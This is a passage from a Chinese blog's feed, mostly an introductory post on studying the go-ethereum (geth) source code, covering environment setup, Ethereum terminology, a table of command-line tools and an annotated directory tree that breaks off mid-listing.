class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">x</span><span class="mord">Δ</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">⊑</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span></span></span></p><p><strong>narrowing 是不保证收敛的，即使收敛也不能保证能够快速收敛。</strong></p><p>根据上图可以知道，使用 narrowing 后的结果是在两个不动点之间，<strong>但是无法判断是否收敛</strong>。</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;blockquote&gt;
&lt;ol class=&quot;series-items&quot;&gt;&lt;li&gt;&lt;a href=&quot;/pl/understanding-program-analysis/&quot; title=&quot;（一）初识软件分析&quot;&gt;（一）初识软件分析&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/pl/data-flow-analysis/&quot; title=&quot;（二）数据流分析基础&quot;&gt;（二）数据流分析基础&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/pl/LP-souffle/&quot; title=&quot;（三）Datalog和程序分析&quot;&gt;（三）Datalog和程序分析&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/pl/ssa-and-sparse-analysis/&quot; title=&quot;（四）静态单赋值和稀疏分析&quot;&gt;（四）静态单赋值和稀疏分析&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/pl/Interprocedural-DFA/&quot; title=&quot;（五）过程间分析&quot;&gt;（五）过程间分析&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/pl/points-to-analysis/&quot; title=&quot;（六）指向分析&quot;&gt;（六）指向分析&lt;</summary>
        
      
    
    
    
    <category term="program language" scheme="https://www.blog-blockchain.xyz/categories/program-language/"/>
    
    
    <category term="program language" scheme="https://www.blog-blockchain.xyz/tags/program-language/"/>
    
  </entry>
  
  <entry>
    <title>geth源码学习——介绍</title>
    <link href="https://www.blog-blockchain.xyz/geth/introduction/"/>
    <id>https://www.blog-blockchain.xyz/geth/introduction/</id>
    <published>2022-09-28T08:30:33.000Z</published>
    <updated>2024-11-15T14:30:54.924Z</updated>
    
    <content type="html"><![CDATA[<blockquote><ol class="series-items"><li><a href="/geth/tx-signature/" title="交易的签名">交易的签名</a></li><li><a href="/geth/understand-receipt/" title="理解收据receipt">理解收据receipt</a></li><li><a href="/geth/blocks/" title="理解区块">理解区块</a></li><li><a href="/geth/understand-tx/" title="理解交易">理解交易</a></li><li><a href="/geth/blockchain-core/" title="blockchain核心">blockchain核心</a></li><li><a href="/geth/forkId/" title="forkId 解读">forkId 解读</a></li><li><a href="/geth/bloom-filter/" title="布隆过滤器原理">布隆过滤器原理</a></li><li><a href="/geth/tx-pool/" title="交易池分析">交易池分析</a></li><li><a href="/geth/oracle-introduction/" title="oracle 原理和实现">oracle 原理和实现</a></li><li><a href="/geth/txlist/" title="TxList 解读">TxList 解读</a></li><li><a href="/geth/MPT-Tree/" title="MPT树">MPT树</a></li><li><a href="/geth/block-sync/" title="区块同步">区块同步</a></li><li><a href="/geth/introduction/" title="geth源码学习——介绍">geth源码学习——介绍</a></li><li><a href="/geth/Geth-Unveiled-Ethereum-Startup/" title="How Geth starts its server">How Geth starts its server</a></li></ol></blockquote><p>项目地址：<a href="https://github.com/learnerLj/geth-analyze">https://github.com/learnerLj/geth-analyze</a></p><h1>环境准备</h1><p>为了方便修改源码后进行调试，建议在 Linux 系统运行，阅读源码时用主机系统可能相对方便。</p><p><strong>安装虚拟机</strong>：建议 Ubuntu20.04，具体安装教程可见其他教程。希望读者有一定的 Linux 基础，熟悉常用命令，理解 Linux 配置文件的思想，会阅读命令行提示信息。安装好虚拟机后可设置代理（学习区块链必须要学会设置代理），自行寻找教程。</p><p><strong>准备环境</strong>：安装 nodejs、npm、goland、typora、中文输入法（可以用百度输入法）、vscode、goland、git，新手自行寻找教程，很容易找到。</p><p>建议使用 godoc，然后输入命令 <code>godoc --http localhost:6060</code>，可以方便地看到自动生成的文档。</p><p><strong>配置 go 编译器</strong>：ubuntu apt 包管理工具的 go 编译器版本太低，需要手动升级。</p><ol><li><p>下载二进制包，可在这里<a href="https://studygolang.com/dl">下载</a>，然后解压、复制到 <code>/usr/local</code>，这是我们一般放软件的地方，然后设置环境变量，建议学习 Linux 的环境变量如何设置，有什么作用。这个目录就是 GOROOT 目录，GOPATH 目录可以通过 <code>go env</code> 找到。</p></li><li><p>下载 go-ethereum，建议使用 apt 下载，因为不用额外的配置，并且附带了一些好用的工具。</p><p>添加源：<code>sudo add-apt-repository -y ppa:ethereum/ethereum</code></p><p>更新软件表：<code>sudo apt-get update</code></p><p>安装稳定版：<code>sudo apt-get install ethereum</code></p><p>遇见问题参考 <a href="https://geth.ethereum.org/docs/install-and-build/installing-geth">官方教程</a> 和博客。注意如果未设置代理，下载速度会很慢，耐心等待。关于如何设置代理，请自行查找教程。</p></li><li><p>克隆仓库，开始工作。配置好自己的 Git，不会使用请自行寻找教程。然后 VSCode、goland 配置好相关环境（自行寻找教程）</p></li><li><p>安装翻译插件，辅助阅读英文注释，推荐 JetBrain 系的 <a href="https://yiiguxing.github.io/TranslationPlugin/index.html">Transaction</a> 和 VSCode 的 Comment Translate。</p></li></ol><hr><p><strong>请注意：仓库基于较新的 geth 源码，本教程和源码都只用于学习，并且只负责解读以及如何修改，不会做实质性的改变</strong></p><h1>以太坊术语</h1><p>在开始解读以太坊前，先了解以太坊中常见术语和名词。以便更好的学习后续内容。大部分内容来自 <a href="https://learnblockchain.cn/books/geth/part0/term.html">博客</a>，本人补充和完善。</p><h2 id="专有名词">专有名词</h2><ul><li>外部账户：EOAs（External Owned Accounts），关联个人掌握的私钥。可以用于发送交易（转移以太币或发送消息），形同一张带数字 ID 的储蓄卡。</li><li>合约账户：Contracts Accounts，可以在以太坊上存储合约代码与合约数据的账户，外部不能直接操作此账户。只能由外部账户直接或间接调用。</li><li>账户状态： account state，表示一个账户在以太坊中的状态。账户状态在账户数据变化时变化。账户状态包含四项信息：nonce、余额、账户存储内容根哈希值、账户代码哈希值。状态数据不直接存储在区块上。</li><li>账户 Nonce: 账户随机数，是账户的交易计数。以防止重放攻击。</li><li>智能合约：Smart Contract，是以太坊成为区块链 2.0 的立足点。以太坊支持通过图灵完备的高级编程语言编写智能合约代码。部署在链上后，可以接受来自外部的交易请求和事件，以触发执行特定的合约代码逻辑，进一步生成新的交易和事件。甚至调用其他的智能合约。</li><li>世界状态：state，管理账户地址到账户状态的映射关系。所有账户的状态构成整个区块链状态。</li><li>交易：Transaction，是外部与以太坊交互的唯一途径，必须由外部账户签名，矿工执行交易，最终打包到区块中。</li><li>交易收据：Receipt，是方便对交易进行零知识证明、索引和搜索，将交易执行过程中的一些特定信息编码为交易收据。</li><li>区块：block，是由一组交易和一些辅助信息（简称区块头）、其他区块头哈希构成的数据块。其他区块头哈希表示父区块或者叔区块。</li><li>叔块：Uncle Block，不能成为主链一部分的孤儿区块，如果有幸被后来的区块收留进区块链就变成了叔块。收留了孤块的区块有额外的奖励。孤块一旦成为叔块，该区块统一可获得奖励。通过叔块奖励机制，来降低以太坊软分叉和平衡网速慢的矿工利益。</li><li>随机数：nonce，记录在区块头中，努力工作的证明。</li><li>Gas：燃料是交易打包到区块时，在 EVM 运行所消耗的资源量的一种形象化概念，比喻需要燃料才能运行 EVM。在以太坊中，将 CPU 资源、存储资源按内置的规则，统一使用 Gas 作为资源单位表达。每执行一次虚拟机指令，均消耗一定的 Gas。</li><li>GasPrice: 燃料价格，任何交易都需要包含一个愿意支付的燃料单价，最终根据交易消耗的燃料量，计算手续费 (usedGas*gasPrice) 支付给矿工。</li><li>价格预测：GPO(Gas Price Oracle)，Gas 价格预测，根据历史交易的 GasPrice 预测未来 GasPrice 走势。</li></ul><h2 id="技术术语">技术术语</h2><ul><li>ZKP: Zero Knowledge Proof，零知识证明。</li><li>EVM：Ethereum Virtual Machine，以太坊虚拟机是执行交易的一个轻量级沙盒虚拟机。</li><li>Message：消息，是一个不能序列化的，并且只存在于以太坊运行环境中的虚拟对象，一条消息主要包括：消息的发送方、接收方、gasLimit 等等；</li><li>序列化：将数据使用 RLP 编码为一组字节数据，便于数据交换与存储。</li><li>RLP: 递归长度前缀编码，一种能够压缩数据的数据编码协议，在以太坊中常用于序列化数据。</li><li>MPT：默克尔压缩前缀树， Merkle Patricia Tree，是一种经过改良的、融合了默克尔树和前缀树两种树结构优点的数据结构，是以太坊中用来组织管理账户数据、生成交易集合哈希的重要数据结构。</li><li>Patricia Trie: 一种压缩前缀树，是一种更节省空间的树，对于 trie 的每个节点，如果该节点是其父节点唯一的儿子的话，就和父节点结合；</li><li>Merkle Tree: 默克尔树，也称为 Hash Tree，默克尔树叶子节点的 value 是数据项的内容，或者是数据项的哈希值；非叶子节点的 value 根据其孩子节点的信息，然后按照 Hash 算法计算而得出的。</li><li>Whisper：密语，是一种依托于 P2P 的通信协议，通过 Whisper 协议，节点可以将信息发送给某个特定节点，实现双节点私聊和按主题在多个节点上通信。主要用于大规模的点对点数据发现、信号协商、最小传输通信、完全隐私保护的 DApp 而设计的。</li><li>LES： Light Ethereum Subprotocol，以太坊客户端的轻量级的子协议，只需要下载区块头，其他详细信息可以按需获取；LES Wiki</li><li>Swarm： 蜂巢，是一个分布式存储平台和内容分发服务，是以太坊 web 3 技术栈的本地基础层服务;</li><li>LLL，Sperpent、Mutan 和 Solidity：用于编写智能合约代码的的编程语言，能被编译成 EVM 代码。</li><li>ERC20: 可以理解成 Ethereum 的一个 Token 协议规范，所有基于 Ethereum 开发的 Token 合约都遵守这个规范。遵守 ERC20 协议规范的 Token 可以被各种 Ethereum 钱包支持。</li><li>ERC721: 是在 ERC20 标准上建立的 Token 协议规范，是针对不可互换 Token(non-fungible tokens 简称 NFT)做的智能合约标准。</li></ul><h1>源码分析准备</h1><h2 id="cmd-目录里自带的工具"><code>cmd</code> 目录里自带的工具.</h2><table><thead><tr><th style="text-align:center">Command</th><th>Description</th></tr></thead><tbody><tr><td style="text-align:center"><strong><code>geth</code></strong></td><td>命令行主程序，使用参考<a href="https://knarfeh.com/2018/03/10/go-ethereum%20%E6%BA%90%E7%A0%81%E7%AC%94%E8%AE%B0%EF%BC%88cmd%20%E6%A8%A1%E5%9D%97-geth%20%E5%91%BD%E4%BB%A4%EF%BC%89/">博客 1</a> <a href="https://github.com/blockchainGuide/blockchainguide/blob/main/source_code_analysis/ethereum/%E4%BB%A5%E5%A4%AA%E5%9D%8A%E5%9F%BA%E7%A1%80%E7%90%86%E8%AE%BA%E9%83%A8%E5%88%86/%E4%BB%A5%E5%A4%AA%E5%9D%8A%E5%90%AF%E5%8A%A8%E5%8F%82%E6%95%B0%E8%AF%A6%E8%A7%A3.md">博客 2</a>和<a href="https://geth.ethereum.org/docs/interface/command-line-options">官方文档</a>。</td></tr><tr><td style="text-align:center"><code>clef</code></td><td>签名工具，可以在后端为<code>geth</code>签名.</td></tr><tr><td style="text-align:center"><code>devp2p</code></td><td>P2P 开发工具，不用运行全节点就可以和其他节点通信。</td></tr><tr><td style="text-align:center"><code>abigen</code></td><td>代码生成器，把合约封装成易用 Golang 的包.</td></tr><tr><td style="text-align:center"><code>bootnode</code></td><td>客户端的精简版，只实现了网络节点协议, 可以在私有网络中辅助寻找节点。</td></tr><tr><td style="text-align:center"><code>evm</code></td><td>以太坊虚拟机 EVM 的开发程序 能够在可配置的环境中运行底层的字节码片段，方便细致的调试以太坊操作码，深入执行过程。</td></tr><tr><td style="text-align:center"><code>rlpdump</code></td><td>以以太坊协议的编码 RLP (<a href="https://eth.wiki/en/fundamentals/rlp">Recursive Length Prefix</a>) 格式输出。</td></tr><tr><td style="text-align:center"><code>puppeth</code></td><td>创建新的以太坊网络时的引导。</td></tr></tbody></table><h2 id="项目结构">项目结构</h2><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br></pre></td><td class="code"><pre><span class="line">├── accounts<span class="comment">//账户管理</span></span><br><span class="line">│   ├── abi<span class="comment">//实现 abi</span></span><br><span class="line">│   │   └── bind <span class="comment">//生成 合约的 go 语言封装</span></span><br><span class="line">│   │       └── backends</span><br><span class="line">│   ├── external</span><br><span class="line">│   ├── keystore <span class="comment">//私钥管理，采用 secp256k 加密</span></span><br><span class="line">│   │   └── testdata</span><br><span class="line">│   │       ├── dupes</span><br><span class="line">│   │       ├── keystore</span><br><span class="line">│   │       │   └── foo</span><br><span class="line">│   │       └── v1</span><br><span class="line">│   │           └── cb61d5a9c4896fb9658090b597ef0e7be6f7b67e</span><br><span class="line">│   ├── scwallet</span><br><span class="line">│   └── usbwallet <span class="comment">//硬件钱包，通过 USB 插入</span></span><br><span class="line">│       └── trezor<span class="comment">//硬件钱包的协议</span></span><br><span class="line">├── build<span class="comment">//用于编译和构建的脚本</span></span><br><span class="line">│   ├── bin</span><br><span class="line">│   └── deb</span><br><span class="line">│       └── ethereum</span><br><span class="line">├── cmd<span class="comment">//命令行工具</span></span><br><span class="line">│   ├── abidump</span><br><span class="line">│   ├── abigen</span><br><span class="line">│   ├── bootnode</span><br><span class="line">│   ├── checkpoint-admin</span><br><span class="line">│   ├── clef</span><br><span class="line">│   │   ├── docs</span><br><span class="line">│   │   │   └── qubes</span><br><span class="line">│   │   ├── testdata</span><br><span class="line">│   │   └── tests</span><br><span class="line">│   ├── devp2p</span><br><span class="line">│   │   └── internal</span><br><span class="line">│   │       ├── ethtest</span><br><span class="line">│   │       │   └── testdata</span><br><span class="line">│   │       ├── v4test</span><br><span class="line">│   │       └── v5test</span><br><span class="line">│   ├── ethkey</span><br><span class="line">│   ├── evm</span><br><span class="line">│   │   ├── internal</span><br><span class="line">│   │   │   ├── compiler</span><br><span class="line">│   │   │   └── t8ntool</span><br><span class="line">│   │   └── testdata</span><br><span class="line">│   │       ├── <span class="number">1</span></span><br><span class="line">│   │       ├── <span class="number">10</span></span><br><span class="line">│   │       ├── <span class="number">11</span></span><br><span class="line">│   │       ├── <span class="number">12</span></span><br><span class="line">│   │       ├── <span class="number">13</span></span><br><span class="line">│   │       ├── <span class="number">14</span></span><br><span class="line">│   │       ├── <span class="number">15</span></span><br><span class="line">│   │       ├── <span class="number">16</span></span><br><span class="line">│   │       ├── <span class="number">17</span></span><br><span class="line">│   │       ├── <span class="number">18</span></span><br><span class="line">│   │       ├── <span class="number">19</span></span><br><span class="line">│   │       ├── <span class="number">2</span></span><br><span class="line">│   │       ├── <span class="number">3</span></span><br><span class="line">│   │       ├── <span class="number">4</span></span><br><span class="line">│   │       ├── <span class="number">5</span></span><br><span class="line">│   │       ├── <span class="number">7</span></span><br><span class="line">│   │       ├── <span class="number">8</span></span><br><span class="line">│   │       └── <span class="number">9</span></span><br><span class="line">│   ├── faucet <span class="comment">//轻量级的水龙头（用于取测试币）</span></span><br><span class="line">│   ├── geth</span><br><span class="line">│   │   └── testdata</span><br><span class="line">│   │       └── vcheck</span><br><span class="line">│   │           ├── minisig-sigs</span><br><span class="line">│   │           ├── signify-sigs</span><br><span class="line">│   │           └── sigs</span><br><span class="line">│   ├── p2psim <span class="comment">//模拟 HTTP API 的调用</span></span><br><span class="line">│   ├── puppeth <span class="comment">//构建私链相关</span></span><br><span class="line">│   │   └── testdata</span><br><span class="line">│   ├── rlpdump <span class="comment">//格式化 rlp 编码，更加漂亮的输出</span></span><br><span class="line">│   └── utils <span class="comment">//一些转化、辅助工具</span></span><br><span class="line">├── common<span class="comment">//工具类</span></span><br><span class="line">│   ├── bitutil <span class="comment">//快速的按位操作</span></span><br><span class="line">│   ├── compiler<span class="comment">//封装 Solidity 和 Vyper 的字节码</span></span><br><span class="line">│   ├── fdlimit</span><br><span class="line">│   ├── hexutil <span class="comment">//十六进制编码</span></span><br><span class="line">│   ├── math <span class="comment">//整数的相关数学工具</span></span><br><span class="line">│   ├── mclock <span class="comment">//用于计时的固定点</span></span><br><span class="line">│   └── prque <span class="comment">//优先队列数据结构</span></span><br><span class="line">├── consensus <span class="comment">//共识算法部分</span></span><br><span class="line">│   ├── clique <span class="comment">//POA</span></span><br><span class="line">│   ├── ethash <span class="comment">//POW</span></span><br><span class="line">│   └── misc</span><br><span class="line">├── console<span class="comment">//控制台</span></span><br><span class="line">│   ├── prompt</span><br><span class="line">│   └── testdata</span><br><span class="line">├── contracts<span class="comment">//合约部分</span></span><br><span class="line">│   └── checkpointoracle</span><br><span class="line">│       └── contract</span><br><span class="line">├── core<span class="comment">//核心数据结构，包括状态机、链式结构、虚拟机等</span></span><br><span class="line">│   ├── asm <span class="comment">//解析汇编指令</span></span><br><span class="line">│   ├── bloombits <span class="comment">//布隆过滤器批量处理</span></span><br><span class="line">│   ├── forkid <span class="comment">//EIP-2124 (https://eips.ethereum.org/EIPS/eip-2124) 的实现</span></span><br><span class="line">│   ├── rawdb <span class="comment">//底层数据库访问</span></span><br><span class="line">│   │   └── testdata</span><br><span class="line">│   ├── state <span class="comment">//以太坊状态树的缓存</span></span><br><span class="line">│   │   ├── pruner</span><br><span class="line">│   │   └── snapshot <span class="comment">//动态状态存储</span></span><br><span class="line">│   ├── types <span class="comment">//共识机制中的数据类型</span></span><br><span class="line">│   └── vm <span class="comment">//EVM 的实现</span></span><br><span class="line">│       ├── runtime <span class="comment">//负责字节码的执行</span></span><br><span class="line">│       └── testdata</span><br><span class="line">│           └── precompiles</span><br><span class="line">├── crypto<span class="comment">//哈希算法和密码学</span></span><br><span class="line">│   ├── blake2b</span><br><span class="line">│   ├── bls12381</span><br><span class="line">│   ├── bn256</span><br><span class="line">│   │   ├── cloudflare</span><br><span class="line">│   │   └── google</span><br><span class="line">│   ├── ecies</span><br><span class="line">│   ├── secp256k1</span><br><span class="line">│   │   └── libsecp256k1</span><br><span class="line">│   │       ├── build-aux</span><br><span class="line">│   │       │   └── m4</span><br><span class="line">│   │       ├── contrib</span><br><span class="line">│   │       ├── include</span><br><span class="line">│   │       ├── obj</span><br><span class="line">│   │       ├── sage</span><br><span class="line">│   │       └── src</span><br><span class="line">│   │           ├── asm</span><br><span class="line">│   │           ├── java</span><br><span class="line">│   │           │   └── org</span><br><span class="line">│   │           │       └── bitcoin</span><br><span class="line">│   │           └── modules</span><br><span class="line">│   │               ├── ecdh</span><br><span class="line">│   │               └── recovery</span><br><span class="line">│   └── signify</span><br><span class="line">├── docs<span class="comment">//部分说明文档</span></span><br><span class="line">│   ├── audits</span><br><span class="line">│   └── postmortems</span><br><span class="line">├── eth<span class="comment">//以太坊协议</span></span><br><span class="line">│   ├── catalyst <span class="comment">//RPC 相关</span></span><br><span class="line">│   ├── downloader <span class="comment">//全节点同步</span></span><br><span class="line">│   ├── ethconfig <span class="comment">//以太坊配置文件和轻节点配置文件</span></span><br><span class="line">│   ├── fetcher <span class="comment">//获取同步时的区块头、交易等</span></span><br><span class="line">│   ├── filters <span class="comment">//区块、日志、事件、交易的过滤</span></span><br><span class="line">│   ├── gasprice</span><br><span class="line">│   ├── protocols</span><br><span class="line">│   │   ├── eth</span><br><span class="line">│   │   └── snap</span><br><span class="line">│   └── tracers <span class="comment">//跟踪交易</span></span><br><span class="line">│       ├── internal</span><br><span class="line">│       │   └── tracetest</span><br><span class="line">│       │       └── testdata</span><br><span class="line">│       │           ├── call_tracer</span><br><span class="line">│       │           └── call_tracer_legacy</span><br><span class="line">│       ├── js <span class="comment">//js 写的交易跟踪器</span></span><br><span class="line">│       │   └── internal</span><br><span class="line">│       │       └── tracers</span><br><span class="line">│       └── native <span class="comment">//go 写的交易跟踪器</span></span><br><span class="line">├── ethclient<span class="comment">//RPC 调用的客户端</span></span><br><span class="line">│   └── gethclient</span><br><span class="line">├── ethdb<span class="comment">//数据库</span></span><br><span class="line">│   ├── dbtest</span><br><span class="line">│   ├── leveldb <span class="comment">//leveldb 数据库实现</span></span><br><span class="line">│   └── memorydb <span class="comment">//内存映射的数据库实现</span></span><br><span class="line">├── ethstats<span class="comment">//网络状态显示</span></span><br><span class="line">├── event<span class="comment">//处理实时事件</span></span><br><span class="line">├── graphql<span class="comment">//提供 GraphQL 的借口</span></span><br><span class="line">├── internal<span class="comment">//内部的一些组件</span></span><br><span class="line">│   ├── build</span><br><span class="line">│   ├── cmdtest</span><br><span class="line">│   ├── debug</span><br><span class="line">│   ├── ethapi</span><br><span class="line">│   ├── flags</span><br><span class="line">│   ├── guide</span><br><span class="line">│   ├── jsre</span><br><span class="line">│   │   └── deps</span><br><span class="line">│   ├── syncx</span><br><span class="line">│   ├── testlog</span><br><span class="line">│   ├── utesting</span><br><span class="line">│   └── web3ext</span><br><span class="line">├── les<span class="comment">//轻量级以太坊子协议(LES)</span></span><br><span class="line">│   ├── checkpointoracle</span><br><span class="line">│   ├── downloader</span><br><span class="line">│   ├── fetcher</span><br><span class="line">│   ├── flowcontrol</span><br><span class="line">│   ├── utils</span><br><span class="line">│   └── vflux</span><br><span class="line">│       ├── client</span><br><span class="line">│       └── server</span><br><span class="line">├── light <span class="comment">//向轻量级客户端提供按需检索的功能</span></span><br><span class="line">├── log<span class="comment">//日志</span></span><br><span class="line">├── metrics<span class="comment">//磁盘读写相关</span></span><br><span class="line">│   ├── exp</span><br><span class="line">│   ├── influxdb</span><br><span class="line">│   ├── librato</span><br><span class="line">│   └── prometheus</span><br><span class="line">├── miner<span class="comment">//区块生成和挖矿</span></span><br><span class="line">│   └── stress</span><br><span class="line">│       ├── <span class="number">1559</span> <span class="comment">//EIP1559 的压力测试</span></span><br><span class="line">│       ├── clique <span class="comment">//Clique 的压测</span></span><br><span class="line">│       └── ethash <span class="comment">//ethash 的压测</span></span><br><span class="line">├── mobile <span class="comment">//为移动端设置的简化版 API</span></span><br><span class="line">├── node<span class="comment">//节点协议</span></span><br><span class="line">├── p2p<span class="comment">//P2P 网络协议</span></span><br><span class="line">│   ├── discover <span class="comment">//节点发现协议</span></span><br><span class="line">│   │   ├── v4wire <span class="comment">//v4 版本</span></span><br><span class="line">│   │   └── v5wire <span class="comment">//v5 版本</span></span><br><span class="line">│   │       └── testdata</span><br><span class="line">│   ├── dnsdisc <span class="comment">//EIP1459 提出的发现协议</span></span><br><span class="line">│   ├── enode</span><br><span class="line">│   ├── enr <span class="comment">//EIP778 提出的节点记录</span></span><br><span class="line">│   ├── msgrate <span class="comment">//估计节点吞吐量实现更平衡的传输</span></span><br><span class="line">│   ├── nat <span class="comment">//端口映射</span></span><br><span class="line">│   ├── netutil</span><br><span class="line">│   ├── nodestate</span><br><span class="line">│   ├── rlpx <span class="comment">//RLPx 传输协议</span></span><br><span class="line">│   ├── simulations</span><br><span class="line">│   │   ├── adapters</span><br><span class="line">│   │   ├── examples</span><br><span class="line">│   │   └── pipes</span><br><span class="line">│   └── tracker</span><br><span class="line">├── params<span class="comment">//参数规定</span></span><br><span class="line">├── rlp<span class="comment">//RLP 序列化格式</span></span><br><span class="line">├── rpc<span class="comment">//双向 JSON-RPC 2.0</span></span><br><span class="line">│   └── testdata</span><br><span class="line">├── signer<span class="comment">//数字签名部分</span></span><br><span class="line">│   ├── core</span><br><span class="line">│   │   ├── apitypes</span><br><span class="line">│   │   └── testdata</span><br><span class="line">│   │       └── fuzzing</span><br><span class="line">│   ├── fourbyte</span><br><span class="line">│   ├── rules</span><br><span class="line">│   └── storage</span><br><span class="line">├── swarm<span class="comment">//swarm 群节点</span></span><br><span class="line">├── tests<span class="comment">//测试数据</span></span><br><span class="line">│   ├── fuzzers</span><br><span class="line">│   │   ├── abi</span><br><span class="line">│   │   ├── bitutil</span><br><span class="line">│   │   ├── bls12381</span><br><span class="line">│   │   │   └── testdata</span><br><span class="line">│   │   ├── bn256</span><br><span class="line">│   │   ├── difficulty</span><br><span class="line">│   │   │   └── debug</span><br><span class="line">│   │   ├── keystore</span><br><span class="line">│   │   │   └── corpus</span><br><span class="line">│   │   ├── les</span><br><span class="line">│   │   │   └── debug</span><br><span class="line">│   │   ├── 